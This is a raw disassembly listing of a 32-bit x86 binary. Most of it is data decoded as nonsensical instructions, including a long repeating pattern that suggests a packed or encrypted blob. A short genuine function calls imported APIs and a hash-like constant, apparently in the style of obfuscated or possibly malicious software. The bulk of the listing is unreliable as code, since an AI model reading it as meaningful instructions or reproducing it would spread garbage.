  42298b:	xor    eax,ecx
  42298d:	pop    ds
  42298e:	xchg   ebx,eax
  42298f:	mov    ebx,0x6924c0ce
  422994:	and    BYTE PTR [edi-0x23],0xbb
  422998:	je     0x422936
  42299a:	push   eax
  42299b:	xchg   edi,eax
  42299c:	lock xor eax,0x35b7ea0e
  4229a2:	hlt    
  4229a3:	fsub   DWORD PTR [ecx]
  4229a5:	adc    edi,DWORD PTR [edx]
  4229a7:	xchg   edx,eax
  4229a8:	cmc    
  4229a9:	sub    eax,0x5b2389ec
  4229ae:	pushf  
  4229af:	pop    esp
  4229b0:	jb     0x4229e5
  4229b2:	cli    
  4229b3:	add    BYTE PTR [edi],0x34
  4229b6:	pop    ebp
  4229b7:	int    0x58
  4229b9:	cld    
  4229ba:	or     BYTE PTR [eax],0x20
  4229bd:	jge    0x4229ac
  4229bf:	dec    edx
  4229c0:	adc    bh,cl
  4229c2:	cmp    BYTE PTR [ecx],bh
  4229c4:	mov    edx,edi
  4229c6:	jb     0x422a21
  4229c8:	ja     0x4229ec
  4229ca:	aad    0xa5
  4229cc:	or     ch,BYTE PTR ds:0xc35a58dc
  4229d2:	sub    eax,0xa12af876
  4229d7:	mov    esi,0x87d83d92
  4229dc:	cmp    ebx,eax
  4229de:	mov    edx,0x92703b48
  4229e3:	sahf   
  4229e4:	rcr    BYTE PTR [ebx],1
  4229e6:	sbb    bh,BYTE PTR [eax+esi*8]
  4229e9:	mov    ebp,0x9b9c0a9
  4229ee:	mov    edx,DWORD PTR [eax-0x31]
  4229f1:	xchg   BYTE PTR [eax-0xb57368],bh
  4229f7:	pop    es
  4229f8:	scas   al,BYTE PTR es:[edi]
  4229f9:	mov    ch,BYTE PTR [esp+ebp*4-0x61b1231]
  422a00:	pop    ds
  422a01:	and    al,0x55
  422a03:	jnp    0x422a38
  422a05:	push   es
  422a06:	fadd   st(0),st
  422a08:	enter  0x4a2a,0x1b
  422a0c:	dec    ebx
  422a0d:	test   al,0x3c
  422a0f:	pusha  
  422a10:	mov    ah,0x24
  422a12:	ins    BYTE PTR es:[edi],dx
  422a13:	pop    ebp
  422a14:	iret   
  422a15:	in     eax,dx
  422a16:	adc    BYTE PTR [eax],bl
  422a18:	mov    dl,0xd5
  422a1a:	add    cl,ah
  422a1c:	repz iret 
  422a1e:	dec    edx
  422a1f:	ins    BYTE PTR es:[edi],dx
  422a20:	ror    ebp,cl
  422a22:	aam    0xe4
  422a24:	imul   ebp,DWORD PTR [ecx],0xfbcaacb1
  422a2a:	out    0x30,eax
  422a2c:	push   ecx
  422a2d:	mov    dl,0x5e
  422a2f:	inc    ebx
  422a30:	call   DWORD PTR [esi+0x75c2524]
  422a36:	xchg   ebp,eax
  422a37:	outs   dx,BYTE PTR ds:[esi]
  422a38:	xor    DWORD PTR [edx+ebp*2+0x4a6e6187],esp
  422a3f:	inc    edi
  422a40:	mov    dl,0x39
  422a42:	inc    ecx
  422a43:	pop    ebp
  422a44:	ret    0x5370
  422a47:	outs   dx,BYTE PTR ds:[si]
  422a49:	mov    bh,0x12
  422a4b:	loopne 0x422a0b
  422a4d:	adc    eax,0xd9bdbe0
  422a52:	inc    ebx
  422a53:	cmc    
  422a54:	push   ds
  422a55:	mov    esp,0x3126bc58
  422a5a:	pop    eax
  422a5b:	shl    DWORD PTR [edx-0x14],cl
  422a5e:	neg    DWORD PTR [esi+eax*1+0x3d2e5383]
  422a65:	xchg   BYTE PTR [ebp+0x7d8d2b84],bl
  422a6b:	shl    DWORD PTR [ebp+0x4b6e9f0c],0xcc
  422a72:	(bad)  
  422a73:	das    
  422a74:	stos   DWORD PTR es:[edi],eax
  422a75:	je     0x422a01
  422a77:	cmp    edx,DWORD PTR [ebp-0x15]
  422a7a:	xchg   BYTE PTR [ebx+esi*8],bl
  422a7d:	cld    
  422a7e:	test   DWORD PTR [ebp-0x3f674ccb],ecx
  422a84:	xchg   BYTE PTR [eax-0x12],al
  422a87:	aad    0x97
  422a89:	sbb    DWORD PTR [esi+0x68b5d8f0],0x7b
  422a90:	adc    bl,ch
  422a92:	jmp    0xfe5751ba
  422a97:	mov    al,0xf
  422a99:	sar    BYTE PTR [edi+0xc],1
  422a9c:	sub    al,0xa4
  422a9e:	xor    DWORD PTR [ecx+0x21],ebx
  422aa1:	mov    esi,0xea0e220a
  422aa6:	enter  0x2262,0x1b
  422aaa:	pop    edx
  422aab:	or     BYTE PTR [edx],ch
  422aad:	pop    esi
  422aae:	adc    DWORD PTR [edi],ecx
  422ab0:	ret    0xa7b0
  422ab3:	xor    edx,DWORD PTR ds:0xb5508352
  422ab9:	test   DWORD PTR [ebp+0x3c1bd6be],esp
  422abf:	mov    eax,ds:0x2104fe0c
  422ac4:	test   esi,eax
  422ac6:	fstp   QWORD PTR [edi+0x53]
  422ac9:	lock adc al,0x31
  422acc:	js     0x422a57
  422ace:	aam    0xfa
  422ad0:	mov    dh,0x7
  422ad2:	dec    edi
  422ad3:	pop    es
  422ad4:	pop    ecx
  422ad5:	pop    es
  422ad6:	lods   eax,DWORD PTR ds:[esi]
  422ad7:	sbb    DWORD PTR [ebx+ebp*2-0x4c93743b],ebx
  422ade:	(bad)  
  422adf:	sti    
  422ae0:	mov    DWORD PTR [esi+0x2a4f70b0],edx
  422ae6:	retf   
  422ae7:	push   eax
  422ae8:	ret    0x7759
  422aeb:	les    ecx,FWORD PTR [edi+eax*1-0x3]
  422aef:	xchg   ecx,eax
  422af0:	mov    dh,0x30
  422af2:	mov    ah,0x73
  422af4:	fistp  WORD PTR [ecx+0x3f3211a6]
  422afa:	mov    ds:0xe467e4b9,eax
  422aff:	mov    al,ds:0x6809fd14
  422b04:	jo     0x422b7c
  422b06:	lahf   
  422b07:	pop    ds
  422b08:	inc    ebx
  422b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b0a:	mov    edi,0x61c0f658
  422b0f:	sbb    eax,0x9d23cc33
  422b14:	and    BYTE PTR [edi],dh
  422b16:	adc    esp,DWORD PTR [edi+0x67cf826f]
  422b1c:	(bad)  
  422b1d:	retf   
  422b1e:	repz xchg ebp,eax
  422b20:	in     eax,0xb
  422b22:	and    ebx,DWORD PTR [ebp+0x7cca76e6]
  422b28:	test   BYTE PTR [ecx],dh
  422b2a:	data16 loopne 0x422ba9
  422b2d:	leave  
  422b2e:	lds    ecx,FWORD PTR [ecx+0x4b]
  422b31:	push   eax
  422b32:	mov    ch,dl
  422b34:	add    DWORD PTR [esi+0x33b5c0a9],0x4b
  422b3b:	fisubr WORD PTR [esi+0x23]
  422b3e:	and    al,0x26
  422b40:	retf   
  422b41:	mov    dl,0xad
  422b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b44:	sub    dh,al
  422b46:	ins    DWORD PTR es:[edi],dx
  422b47:	std    
  422b48:	jge    0x422b70
  422b4a:	pop    ds
  422b4b:	push   edx
  422b4c:	dec    esi
  422b4d:	(bad)  
  422b4f:	mov    ch,bh
  422b51:	rol    DWORD PTR [ecx+eiz*4+0x6fc59913],1
  422b58:	inc    esi
  422b59:	sbb    BYTE PTR [ebx+0x7d8c87b9],ah
  422b5f:	mov    al,0xd8
  422b61:	cmc    
  422b62:	repz enter 0x5806,0x96
  422b67:	mov    esp,0xaa04af02
  422b6c:	inc    ecx
  422b6d:	clc    
  422b6e:	xor    esi,eax
  422b70:	jp     0x422bd7
  422b72:	inc    ebp
  422b73:	lods   al,BYTE PTR ds:[esi]
  422b74:	dec    edi
  422b75:	inc    ebp
  422b76:	jge    0x422b0a
  422b78:	mov    ah,dh
  422b7a:	arpl   WORD PTR [eax-0x4c4872cc],dx
  422b80:	dec    ebx
  422b81:	mov    ebx,0xd0c2e644
  422b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b87:	xor    al,0xd8
  422b89:	dec    esp
  422b8a:	and    eax,0x4f6ad95c
  422b8f:	add    eax,esp
  422b91:	inc    edi
  422b92:	sbb    DWORD PTR [esp+esi*4+0x362c9766],esp
  422b99:	mov    dh,0x1b
  422b9b:	daa    
  422b9c:	sar    BYTE PTR [eax-0x4d704ba4],0x9d
  422ba3:	push   es
  422ba4:	fcmovbe st,st(4)
  422ba6:	rcr    ebx,1
  422ba8:	xchg   edx,eax
  422ba9:	cmp    edi,DWORD PTR [ebx-0x42]
  422bac:	mov    dl,BYTE PTR [eax+0x793b9ee8]
  422bb2:	push   ss
  422bb3:	dec    ebx
  422bb4:	mov    edi,0xac5fda2
  422bb9:	sti    
  422bba:	dec    ecx
  422bbb:	(bad)  
  422bbc:	jne    0x422bea
  422bbe:	test   BYTE PTR [edi],al
  422bc0:	or     DWORD PTR [ecx],edx
  422bc2:	lods   al,BYTE PTR ds:[esi]
  422bc3:	ret    0x61aa
  422bc6:	or     edx,ebp
  422bc8:	sub    eax,0x5d876cce
  422bcd:	jg     0x422bc8
  422bcf:	jnp    0x422c4a
  422bd1:	test   al,0x7f
  422bd3:	dec    DWORD PTR [eax+0x44]
  422bd6:	xchg   esi,eax
  422bd7:	je     0x422c05
  422bd9:	sar    dl,1
  422bdb:	test   edx,ecx
  422bdd:	fsubr  DWORD PTR [ebx-0x63]
  422be0:	and    esi,ebx
  422be2:	fwait
  422be3:	mov    al,ds:0xbcca7fe8
  422be8:	fnstcw WORD PTR [ecx-0x733bc6bd]
  422bee:	jmp    0x5fa4:0x7dd247d9
  422bf5:	adc    BYTE PTR ds:0xcac0d17c,bh
  422bfb:	in     eax,0xff
  422bfd:	push   cs
  422bfe:	or     ah,BYTE PTR [ecx-0xbc15b99]
  422c04:	jle    0x422c12
  422c06:	xor    BYTE PTR [edx],0x89
  422c09:	pop    ecx
  422c0a:	mul    BYTE PTR [ebx]
  422c0c:	bound  edx,QWORD PTR [ecx+eax*4+0x3b7100dc]
  422c13:	outs   dx,DWORD PTR ds:[esi]
  422c14:	adc    BYTE PTR [edx],dl
  422c16:	test   BYTE PTR [ecx+ebp*2+0x6aeb560d],cl
  422c1d:	(bad)  
  422c1e:	div    eax
  422c20:	outs   dx,DWORD PTR ds:[esi]
  422c21:	jb     0x422c9a
  422c23:	add    al,0x42
  422c25:	ds stos BYTE PTR es:[edi],al
  422c27:	ds push ebp
  422c29:	push   cs
  422c2a:	punpckldq mm5,DWORD PTR [eax]
  422c2d:	pop    eax
  422c2e:	cmp    esi,esi
  422c30:	lds    esi,FWORD PTR [ecx]
  422c32:	cmp    al,0x93
  422c34:	push   edx
  422c35:	mov    WORD PTR [ebp+ebx*1+0x4070fb66],es
  422c3c:	mov    ds:0xd8c5a9d0,eax
  422c41:	push   ds
  422c42:	mov    bl,0x0
  422c44:	ins    DWORD PTR es:[edi],dx
  422c45:	cmp    DWORD PTR [edi+0x7f],eax
  422c48:	push   ds
  422c49:	cld    
  422c4a:	mov    esi,0x77f4a443
  422c4f:	inc    esp
  422c50:	mov    dh,0xfa
  422c52:	xchg   DWORD PTR [ecx+0x39],edi
  422c55:	mov    edx,0xc8f4b59c
  422c5a:	jae    0x422c7a
  422c5c:	adc    edi,DWORD PTR [ebp+0xa]
  422c5f:	or     eax,0x345335e4
  422c64:	clc    
  422c65:	mov    eax,ds:0xc822b398
  422c6a:	into   
  422c6b:	push   ss
  422c6c:	sub    BYTE PTR [esi],dh
  422c6e:	or     al,0xa7
  422c70:	mov    WORD PTR [esi+0x24],es
  422c73:	js     0x422cec
  422c75:	adc    dl,bh
  422c77:	inc    edx
  422c78:	pop    edx
  422c79:	ins    DWORD PTR es:[edi],dx
  422c7a:	add    bh,BYTE PTR [ebx+0x7bfab8ab]
  422c80:	imul   ebx,DWORD PTR [ebp-0x1663da0a],0x6d948d0f
  422c8a:	loopne 0x422c5e
  422c8c:	pop    eax
  422c8d:	fwait
  422c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c8f:	sub    BYTE PTR [esi+0x74],cl
  422c92:	push   esp
  422c93:	or     edi,ecx
  422c95:	test   DWORD PTR [eax],ecx
  422c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c98:	stc    
  422c99:	or     BYTE PTR [ecx+edx*8+0x2386079c],dh
  422ca0:	fadd   DWORD PTR [edi-0x7a]
  422ca3:	and    DWORD PTR [ecx],ecx
  422ca5:	jecxz  0x422cb9
  422ca7:	not    BYTE PTR [esi+0x33]
  422caa:	(bad)  
  422cab:	fs mov dh,0xbd
  422cae:	into   
  422caf:	jg     0x422cd3
  422cb1:	jns    0x422c44
  422cb3:	adc    ah,BYTE PTR [eax+0x21ff43a6]
  422cb9:	cli    
  422cba:	(bad)  
  422cbb:	mov    al,ds:0xd65d722a
  422cc0:	sub    DWORD PTR [edi-0x25ba6601],0x850946df
  422cca:	lock mov eax,ds:0x7fb3a89e
  422cd0:	inc    DWORD PTR [edi]
  422cd2:	sub    dl,ch
  422cd4:	idiv   BYTE PTR [ecx+0xe]
  422cd7:	call   0xa88:0x8b3956b9
  422cde:	rol    BYTE PTR [edx+0x49],0x3f
  422ce2:	push   ecx
  422ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ce4:	repz mov ecx,0x2bd62d48
  422cea:	sub    DWORD PTR [eax],edi
  422cec:	xor    al,0x6
  422cee:	ret    0xafe5
  422cf1:	xchg   ecx,ebx
  422cf3:	push   ebp
  422cf4:	mov    esi,DWORD PTR fs:[ebx+0x15]
  422cf8:	adc    al,0x5b
  422cfa:	or     DWORD PTR [eax],0x2e
  422cfd:	inc    edx
  422cfe:	bound  ecx,QWORD PTR [ecx]
  422d00:	mov    edi,DWORD PTR [esi+0x53]
  422d03:	jns    0x422ce1
  422d05:	aas    
  422d06:	jle    0x422c9f
  422d08:	imul   ecx,DWORD PTR [edi+esi*1-0x736a28a4],0xffffffb0
  422d10:	push   ds
  422d11:	jp     0x9a865126
  422d17:	jle    0x422d31
  422d19:	jns    0x422d94
  422d1b:	arpl   WORD PTR [eax-0x6],cx
  422d1e:	imul   ecx,esi,0x169586dc
  422d24:	es inc ecx
  422d26:	(bad)  [ecx-0x79dba22]
  422d2c:	std    
  422d2d:	add    edx,esp
  422d2f:	test   BYTE PTR [ebx-0x2c],ah
  422d32:	iret   
  422d33:	imul   edi,DWORD PTR [edi-0x19bdb1b5],0xffffff94
  422d3a:	les    esp,FWORD PTR [edx]
  422d3c:	enter  0x913d,0xff
  422d40:	das    
  422d41:	xor    cl,BYTE PTR [esi+0x659e67ee]
  422d47:	jbe    0x422d66
  422d49:	jl     0x422d44
  422d4b:	inc    edi
  422d4c:	(bad)  
  422d4d:	and    DWORD PTR [ebx+0x3d],ecx
  422d50:	push   eax
  422d51:	adc    BYTE PTR [ebp+ecx*2+0x32441c61],cl
  422d58:	enter  0xc865,0x59
  422d5c:	sar    BYTE PTR [ebp-0x71],cl
  422d5f:	pop    ecx
  422d60:	inc    ebp
  422d61:	ret    0xa77a
  422d64:	loop   0x422db5
  422d66:	test   BYTE PTR [esi+0xf],0x52
  422d6a:	jno    0x422daa
  422d6c:	std    
  422d6d:	push   ebx
  422d6e:	push   ebp
  422d6f:	(bad)  
  422d70:	xchg   edi,eax
  422d71:	aaa    
  422d72:	in     eax,0xb
  422d74:	sub    al,0xcd
  422d76:	out    0xfa,eax
  422d78:	retf   0xaffb
  422d7b:	push   esi
  422d7c:	mov    edi,0xcb1c6763
  422d81:	pusha  
  422d82:	lods   eax,DWORD PTR ds:[esi]
  422d83:	sbb    eax,eax
  422d85:	fcomi  st,st(4)
  422d87:	out    dx,al
  422d88:	inc    ecx
  422d89:	jp     0x422d41
  422d8b:	sbb    DWORD PTR [esi],esi
  422d8d:	out    0xa5,eax
  422d8f:	mov    dh,0x49
  422d91:	(bad)  
  422d92:	jmp    0x901f6b
  422d97:	xlat   BYTE PTR ds:[ebx]
  422d98:	fld    DWORD PTR [eax+0x7]
  422d9b:	leave  
  422d9c:	test   al,0x72
  422d9e:	sub    al,0x6
  422da0:	loope  0x422df5
  422da2:	ror    BYTE PTR [edi+0x753b6214],0xc6
  422da9:	cmp    eax,DWORD PTR [eax-0x2e14f6e]
  422daf:	scas   eax,DWORD PTR es:[edi]
  422db0:	dec    esi
  422db1:	addr16 aaa 
  422db3:	iret   
  422db4:	cmp    eax,0x8533809e
  422db9:	jns    0x422d58
  422dbb:	mov    cl,0x68
  422dbd:	hlt    
  422dbe:	add    BYTE PTR [edi-0x5d],ah
  422dc1:	retf   
  422dc2:	xor    dh,al
  422dc4:	xor    esi,DWORD PTR [ecx]
  422dc6:	js     0x422e18
  422dc8:	inc    ebx
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	fsubr  DWORD PTR [edi+0x26]
  422dce:	ss out 0x72,eax
  422dd1:	mov    edx,0x8110724e
  422dd6:	test   BYTE PTR [edx],al
  422dd8:	lods   eax,DWORD PTR ds:[esi]
  422dd9:	scas   al,BYTE PTR es:[edi]
  422dda:	xor    dl,BYTE PTR [edi+eiz*2]
  422ddd:	sub    ebp,DWORD PTR [esi-0x6dd724c0]
  422de3:	pop    esp
  422de4:	mov    al,0x91
  422de6:	retf   0xc2e7
  422de9:	loop   0x422d8c
  422deb:	mov    ch,0x2
  422ded:	fdivr  QWORD PTR [eax+0x1]
  422df3:	mov    esp,ebp
  422df5:	pop    ebp
  422df6:	ret    
  422df7:	int3   
  422df8:	int3   
  422df9:	int3   
  422dfa:	int3   
  422dfb:	int3   
  422dfc:	int3   
  422dfd:	int3   
  422dfe:	int3   
  422dff:	int3   
  422e00:	push   ebp
  422e01:	mov    ebp,esp
  422e03:	sub    esp,0x8
  422e06:	push   esi
  422e07:	push   0xffff
  422e0c:	push   0x0
  422e0e:	mov    DWORD PTR [ebp-0x4],0x0
  422e15:	call   DWORD PTR ds:0x42902c
  422e1b:	mov    esi,DWORD PTR ds:0x429034
  422e21:	push   0xa
  422e23:	push   0x0
  422e25:	push   0x0
  422e27:	push   0xffffffff
  422e29:	mov    DWORD PTR [ebp-0x8],esi
  422e2c:	call   0x424340
  422e31:	test   esi,esi
  422e33:	jne    0x422e3f
  422e35:	push   esi
  422e36:	push   0x1
  422e38:	push   esi
  422e39:	call   DWORD PTR ds:0x429028
  422e3f:	push   0x0
  422e41:	push   0x4e
  422e43:	push   0x1e
  422e45:	push   0x0
  422e47:	call   DWORD PTR ds:0x429024
  422e4d:	test   eax,eax
  422e4f:	je     0x422e59
  422e51:	push   0x0
  422e53:	call   DWORD PTR ds:0x429008
  422e59:	mov    esi,DWORD PTR [ebp-0x8]
  422e5c:	call   esi
  422e5e:	mov    DWORD PTR [ebp-0x4],eax
  422e61:	mov    esi,DWORD PTR [ebp-0x4]
  422e64:	cmp    esi,0x57
  422e67:	jne    0x422e7e
  422e69:	push   0x83ea710a
  422e6e:	call   0x411080
  422e73:	add    esp,0x4
  422e76:	push   0x0
  422e78:	call   DWORD PTR ds:0x429020
  422e7e:	push   0x5
  422e80:	push   esi
  422e81:	call   DWORD PTR ds:0x42913c
  422e87:	xor    eax,eax
  422e89:	pop    esi
  422e8a:	mov    esp,ebp
  422e8c:	pop    ebp
  422e8d:	ret    
  422e8e:	nop
  422e8f:	nop
  422e90:	sub    esp,0x10
  422e93:	push   0x0
  422e95:	push   0x0
  422e97:	push   0x0
  422e99:	call   DWORD PTR ds:0x429038
  422e9f:	push   0x0
  422ea1:	push   0x0
  422ea3:	call   DWORD PTR ds:0x429148
  422ea9:	lea    eax,[esp+0x0]
  422ead:	push   eax
  422eae:	call   DWORD PTR ds:0x429054
  422eb4:	call   DWORD PTR ds:0x429034
  422eba:	push   0x0
  422ebc:	push   0x0
  422ebe:	push   0x0
  422ec0:	call   0x424346
  422ec5:	cmp    WORD PTR [esp+0x0],0x0
  422ecb:	push   0x0
  422ecd:	je     0x422ee6
  422ecf:	push   0x0
  422ed1:	call   DWORD PTR ds:0x429130
  422ed7:	push   0x0
  422ed9:	call   0x422e00
  422ede:	add    esp,0x4
  422ee1:	jmp    0x42431e
  422ee6:	push   0x14
  422ee8:	push   0x0
  422eea:	push   0x0
  422eec:	call   DWORD PTR ds:0x429010
  422ef2:	jmp    FWORD PTR [edx]
  422ef4:	mov    BYTE PTR [ebp+ebx*4-0x47bd2a05],ah
  422efb:	pop    ebp
  422efc:	inc    esp
  422efd:	push   0xffffffa5
  422eff:	sbb    DWORD PTR [eax-0x7dacb2e],ebx
  422f05:	aad    0x42
  422f07:	mov    eax,0xe56a4459
  422f0c:	out    0x67,al
  422f0e:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  422f15:	pop    ecx
  422f16:	inc    esp
  422f17:	push   0xffffffa5
  422f19:	out    0x67,al
  422f1b:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  422f22:	pop    ecx
  422f23:	inc    esp
  422f24:	push   0xffffffa5
  422f26:	out    0x67,al
  422f28:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  422f2f:	mov    eax,ds:0xe8a56a44
  422f34:	js     0x422f9e
  422f36:	cmp    bl,BYTE PTR [ebp-0x667023b4]
  422f3c:	loope  0x422f83
  422f3e:	es push 0x5dba33c7
  422f44:	out    dx,al
  422f45:	fsub   DWORD PTR [ebp+0x363ed730]
  422f4b:	or     ecx,eax
  422f4d:	mov    BYTE PTR [ebx+esi*4],0x5a
  422f51:	repz xchg edi,eax
  422f53:	mov    eax,ds:0x643cda62
  422f58:	sbb    al,dl
  422f5a:	mov    BYTE PTR [edi-0x45],al
  422f5d:	pop    edx
  422f5e:	mov    ebp,0x98119abc
  422f63:	xor    al,0x2b
  422f65:	push   cs
  422f66:	ror    al,0x6a
  422f69:	fistp  QWORD PTR [esi]
  422f6b:	mov    ecx,0xb842d5f8
  422f70:	pop    ecx
  422f71:	inc    esp
  422f72:	push   0xffffffa2
  422f74:	jg     0x422f11
  422f76:	mov    esi,DWORD PTR [edi+0x65]
  422f79:	push   0xffffffdf
  422f7b:	add    DWORD PTR [eax-0x35],eax
  422f7e:	dec    esi
  422f7f:	sub    DWORD PTR [ebp+0x74],ebx
  422f82:	ins    DWORD PTR es:[edi],dx
  422f83:	mov    dl,BYTE PTR [ecx-0x6f]
  422f86:	repnz mov bh,BYTE PTR [edx+0xf1c532a]
  422f8d:	popf   
  422f8e:	in     al,dx
  422f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f90:	sub    ah,BYTE PTR [esi+0x7bb0a097]
  422f96:	mov    dl,0x31
  422f98:	mov    esp,0xe9caaff8
  422f9d:	jmp    0x422fdd
  422f9f:	fild   DWORD PTR [eax]
  422fa1:	inc    edi
  422fa2:	dec    eax
  422fa3:	repnz fst DWORD PTR [ebp+0x60]
  422fa7:	out    dx,eax
  422fa8:	push   ds
  422fa9:	cmc    
  422faa:	fdivr  DWORD PTR [esi+0x1d]
  422fad:	stc    
  422fae:	fistp  WORD PTR [edx]
  422fb0:	inc    eax
  422fb1:	retf   
  422fb2:	dec    esi
  422fb3:	sub    DWORD PTR [ebp+0x75],ebx
  422fb6:	ins    DWORD PTR es:[edi],dx
  422fb7:	cli    
  422fb8:	int    0xf
  422fba:	repnz push 0xffffff9a
  422fbd:	cmp    BYTE PTR [ebx+0x9],dl
  422fc0:	xchg   edx,eax
  422fc1:	aaa    
  422fc2:	in     al,dx
  422fc3:	aas    
  422fc4:	mov    bh,0x9
  422fc6:	xchg   edi,eax
  422fc7:	lock sub eax,0x2101b2d0
  422fcd:	bound  ebp,QWORD PTR [edi+0x3e409fa4]
  422fd3:	lds    ebx,FWORD PTR [ebp-0x5e05b726]
  422fd9:	(bad)  
  422fda:	pusha  
  422fdb:	test   DWORD PTR [edi+0x6577ba04],0xb842df6a
  422fe5:	pop    ecx
  422fe6:	inc    esp
  422fe7:	push   0xffffffa5
  422fe9:	out    0x67,al
  422feb:	xor    BYTE PTR [ecx-0x63],0xf8
  422fef:	cdq    
  422ff0:	inc    ebx
  422ff1:	mov    edx,0xfa89a859
  422ff6:	test   eax,0x9d34d267
  422ffb:	clc    
  422ffc:	aad    0x42
  422ffe:	mov    eax,0xa46944b9
  423003:	in     eax,dx
  423004:	data16 fdiv DWORD PTR [ebx*4-0x47bd2eec]
  42300c:	pop    ebp
  42300d:	inc    edx
  42300e:	push   0xffffffa5
  423010:	out    0x67,al
  423012:	shl    BYTE PTR ds:0x42d5f820,cl
  423018:	test   al,0x59
  42301a:	inc    esp
  42301b:	push   0xffffffa5
  42301d:	jecxz  0x423086
  42301f:	shl    BYTE PTR [esp+ebx*8],cl
  423022:	clc    
  423023:	aad    0x52
  423025:	mov    eax,0xa5684459
  42302a:	out    0x62,al
  42302c:	shl    BYTE PTR ds:0x42d5f89d,cl
  423032:	mov    eax,0xa56b445c
  423037:	out    0x67,al
  423039:	shl    BYTE PTR [ebx*4-0x47bd2188],cl
  423040:	pop    ebp
  423041:	inc    esp
  423042:	push   0x18
  423044:	xlat   BYTE PTR ds:[ebx]
  423045:	(bad)
  42304a:	push   ebp
  42304b:	inc    edx
  42304c:	mov    eax,0xb56a4449
  423051:	out    0x67,al
  423053:	shl    BYTE PTR [ecx*4-0x47ad2a08],cl
  42305a:	pop    ecx
  42305b:	inc    esp
  42305c:	push   0xffffffa5
  42305e:	out    0x77,al
  423060:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423067:	pop    ecx
  423068:	inc    esp
  423069:	push   0xffffffa5
  42306b:	bound  ecx,QWORD PTR [ecx]
  42306d:	fnstenv [esp+esi*8]
  423070:	sti    
  423071:	aad    0x42
  423073:	mov    eax,0x6a6a4f69
  423078:	(bad)  [edi-0x2e]
  42307b:	xor    al,0x9d
  42307d:	clc    
  42307e:	aad    0x42
  423080:	mov    eax,0xa56a4459
  423085:	out    0x67,al
  423087:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42308e:	pop    ecx
  42308f:	inc    esp
  423090:	push   0xffffffa5
  423092:	out    0x67,al
  423094:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42309b:	pop    ecx
  42309c:	inc    esp
  42309d:	push   0xffffffa5
  42309f:	out    0x67,al
  4230a1:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4230a8:	pop    ecx
  4230a9:	inc    esp
  4230aa:	push   0xffffffa5
  4230ac:	out    0x67,al
  4230ae:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4230b5:	pop    ecx
  4230b6:	inc    esp
  4230b7:	push   0xffffffa5
  4230b9:	out    0x67,al
  4230bb:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4230c2:	pop    ecx
  4230c3:	inc    esp
  4230c4:	push   0xffffffa5
  4230c6:	out    0x67,al
  4230c8:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4230cf:	pop    ecx
  4230d0:	inc    esp
  4230d1:	push   0xffffffa5
  4230d3:	out    0x67,al
  4230d5:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4230dc:	pop    ecx
  4230dd:	inc    esp
  4230de:	push   0xffffffa5
  4230e0:	out    0x67,al
  4230e2:	rcr    BYTE PTR [edx],cl
  4230e4:	jmp    0xb878de86
  4230e9:	pop    ecx
  4230ea:	inc    esp
  4230eb:	push   0xffffff85
  4230ed:	in     eax,dx
  4230ee:	shl    BYTE PTR [si],cl
  4230f1:	popf   
  4230f2:	clc    
  4230f3:	aad    0x78
  4230f5:	mov    esp,0xa56e4459
  4230fa:	out    0x37,al
  4230fc:	xchg   edi,eax
  4230fd:	ja     0x4230ae
  4230ff:	lods   al,BYTE PTR ds:[esi]
  423100:	call   0xa56a:0x4459b842
  423107:	(bad)  
  423108:	addr16 rcl ah,cl
  42310b:	mov    bl,0x8a
  42310d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42310e:	xor    bl,bl
  423110:	pop    ecx
  423111:	inc    esp
  423112:	push   0xffffffa5
  423114:	mov    dh,0x67
  423116:	shl    BYTE PTR [ebp*4-0x17bd2a0d],cl
  42311d:	pop    ecx
  42311e:	inc    esp
  42311f:	push   0xffffff9b
  423121:	loop   0x42318a
  423123:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42312a:	pop    ecx
  42312b:	inc    esp
  42312c:	push   0xffffffa5
  42312e:	out    0x47,al
  423130:	shl    BYTE PTR [edi*2-0x47bd2a08],cl
  423137:	pop    ecx
  423138:	inc    esp
  423139:	push   0xffffffa5
  42313b:	out    0x67,al
  42313d:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423144:	pop    ecx
  423145:	inc    esp
  423146:	push   0xffffffa5
  423148:	out    0x67,al
  42314a:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423151:	pop    ecx
  423152:	inc    esp
  423153:	push   0xffffffa5
  423155:	out    0x67,al
  423157:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42315e:	pop    ecx
  42315f:	inc    esp
  423160:	push   0xffffffa5
  423162:	out    0x67,al
  423164:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42316b:	pop    ecx
  42316c:	inc    esp
  42316d:	push   0xffffffa5
  42316f:	out    0x67,al
  423171:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423178:	pop    ecx
  423179:	inc    esp
  42317a:	push   0xffffffa5
  42317c:	out    0x67,al
  42317e:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423185:	pop    ecx
  423186:	inc    esp
  423187:	push   0xffffffa5
  423189:	out    0x67,al
  42318b:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423192:	pop    ecx
  423193:	inc    esp
  423194:	push   0xffffffa5
  423196:	out    0x67,al
  423198:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42319f:	pop    ecx
  4231a0:	inc    esp
  4231a1:	push   0xffffffa5
  4231a3:	out    0x67,al
